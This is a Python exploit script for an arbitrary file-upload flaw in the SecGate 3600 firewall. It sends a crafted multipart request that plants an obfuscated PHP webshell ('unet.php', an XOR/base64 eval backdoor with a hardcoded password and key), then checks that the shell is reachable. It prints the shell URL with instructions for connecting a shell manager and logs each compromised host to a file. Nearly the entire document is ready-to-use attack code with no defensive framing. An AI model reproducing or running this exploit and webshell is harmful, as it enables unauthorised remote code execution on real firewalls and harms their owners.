import requests
import time
import buter
import wirtefile

filename = "./reps/网神-SecGate-3600-防火墙任意文件上传漏洞-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Content-Type": "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae"
        }
poc = "/?g=obj_app_upfile"
data = '--502f67681799b07e4de6b503655f5cae\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n10000000\r\n--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name="upfile"; filename="unet.php"\r\nContent-Type: text/plain\r\n\r\n<?php \u0065\u0063\u0068\u006f\u0020\u0062\u0061\u0073\u0065\u0036\u0034\u005f\u0064\u0065\u0063\u006f\u0064\u0065\u0028\u0022\u005a\u0054\u0045\u0032\u004e\u0054\u0051\u0079\u004d\u0054\u0045\u0078\u004d\u0047\u004a\u0068\u004d\u0044\u004d\u0077\u004f\u0054\u006c\u0068\u004d\u007a\u0041\u007a\u004f\u0054\u004d\u007a\u004e\u007a\u004e\u006a\u004e\u0057\u0049\u0030\u004d\u0077\u003d\u003d\u0022\u0029\u003b\u000a\u0040\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u005f\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u003b\u000a\u0040\u0073\u0065\u0074\u005f\u0074\u0069\u006d\u0065\u005f\u006c\u0069\u006d\u0069\u0074\u0028\u0030\u0029\u003b\u000a\u0040\u0065\u0072\u0072\u006f\u0072\u005f\u0072\u0065\u0070\u006f\u0072\u0074\u0069\u006e\u0067\u0028\u0030\u0029\u003b\u000a\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e\u0020\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0024\u0044\u002c\u0024\u004b\u0029\u007b\u000a\u0020\u0020\u0020\u0020\u0066\u006f\u0072\u0028\u0024\u0069\u003d\u0030\u003b\u0024\u0069\u003c\u0073\u0074\u0072\u006c\u0065\u006e\u0028\u0024\u0044\u0029\u003b\u0024\u0069\u002b\u002b\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0024\u0063\u0020\u003d\u0020\u0024\u004b\u005b\u0024\u0069\u002b\u0031\u0026\u0031\u0035\u005d\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0024\u0044\u005b\u0024\u0069\u005d\u0020\u003d\u0020\u0024\u0044\u005b\u0024\u0069\u005d\u005e\u0024\u0063\u003b\u000a\u0020\u0020\u0020\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0024\u0044\u003b\u000a\u007d\u000a\u0024\u0070\u0061\u0073\u0073\u003d\u0027\u0070\u0061\u0073\u0073\u0027\u003b\u000a\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u004e\u0061\u006d\u0065\u003d\u0027\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u0027\u003b\u000a\u0024\u006b\u0065\u0079\u003d\u0027\u0033\u0063\u0036\u0065\u0030\u0062\u0038\u0061\u0039\u0063\u0031\u0035\u0032\u0032\u0034\u0061\u0027\u003b\u000a\u0069\u0066\u0020\u0028\u0069\u0073\u0073\u0065\u0074\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0024\u0070\u0061\u0073\u0073\u005d\u0029\u0029\u007b\u000a\u0020\u0020\u0020\u0020\u0024\u0064\u0061\u0074\u0061\u003d\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0062\u0061\u0073\u0065\u0036\u0034\u005f\u0064\u0065\u0063\u006f\u0064\u0065\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0024\u0070\u0061\u0073\u0073\u005d\u0029\u002c\u0024\u006b\u0065\u0079\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0069\u0066\u0020\u0028\u0069\u0073\u0073\u0065\u0074\u0028\u0024\u005f\u0053\u0045\u0053\u0053\u0049\u004f\u004e\u005b\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u004e\u0061\u006d\u0065\u005d\u0029\u0029\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u003d\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0024\u005f\u0053\u0045\u0053\u0053\u0049\u004f\u004e\u005b\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u004e\u0061\u006d\u0065\u005d\u002c\u0024\u006b\u0065\u0079\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0069\u0066\u0020\u0028\u0073\u0074\u0072\u0070\u006f\u0073\u0028\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u002c\u0022\u0067\u0065\u0074\u0042\u0061\u0073\u0069\u0063\u0073\u0049\u006e\u0066\u006f\u0022\u0029\u003d\u003d\u003d\u0066\u0061\u006c\u0073\u0065\u0029\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u003d\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u002c\u0024\u006b\u0065\u0079\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d\u000a\u0009\u0009\u0065\u0076\u0061\u006c\u0028\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0065\u0063\u0068\u006f\u0020\u0073\u0075\u0062\u0073\u0074\u0072\u0028\u006d\u0064\u0035\u0028\u0024\u0070\u0061\u0073\u0073\u002e\u0024\u006b\u0065\u0079\u0029\u002c\u0030\u002c\u0031\u0036\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0065\u0063\u0068\u006f\u0020\u0062\u0061\u0073\u0065\u0036\u0034\u005f\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0040\u0072\u0075\u006e\u0028\u0024\u0064\u0061\u0074\u0061\u0029\u002c\u0024\u006b\u0065\u0079\u0029\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0065\u0063\u0068\u006f\u0020\u0073\u0075\u0062\u0073\u0074\u0072\u0028\u006d\u0064\u0035\u0028\u0024\u0070\u0061\u0073\u0073\u002e\u0024\u006b\u0065\u0079\u0029\u002c\u0031\u0036\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u007d\u0065\u006c\u0073\u0065\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0069\u0066\u0020\u0028\u0073\u0074\u0072\u0070\u006f\u0073\u0028\u0024\u0064\u0061\u0074\u0061\u002c\u0022\u0067\u0065\u0074\u0042\u0061\u0073\u0069\u0063\u0073\u0049\u006e\u0066\u006f\u0022\u0029\u0021\u003d\u003d\u0066\u0061\u006c\u0073\u0065\u0029\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0024\u005f\u0053\u0045\u0053\u0053\u0049\u004f\u004e\u005b\u0024\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u004e\u0061\u006d\u0065\u005d\u003d\u0065\u006e\u0063\u006f\u0064\u0065\u0028\u0024\u0064\u0061\u0074\u0061\u002c\u0024\u006b\u0065\u0079\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u007d\u000a\u007d?>\r\n\r\n--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name="submit_post"\r\n\r\nobj_app_upfile\r\n--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name="__hash__"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n--502f67681799b07e4de6b503655f5cae--'


def SG3600fileupRCE(url):
    try:
        response = requests.post(url=url+poc, headers=headers, data=data,verify=False, timeout=5,)
        connect_path2 = "/attachements/unet.php"
        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        }
        response2 = requests.get(url=url+connect_path2, headers=header, timeout=3, verify=False)
        if "e165421110ba03099a30393373c5b43" in response2.text and response2.status_code == 200:
            shell_path = url+connect_path2
            print(buter.colors.GREEN + f"存在网神 SecGate 3600 防火墙任意文件上传漏洞 url : {url} \n请使用 gsl pass&key php_xor_base64 connect : {shell_path}" + buter.colors.END)
            wirtefile.writefiles(filename,shell_path)
        else:
            print(buter.colors.RED + f"不存在网神 SecGate 3600 防火墙任意文件上传漏洞 url : {url}" + buter.colors.END)

    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
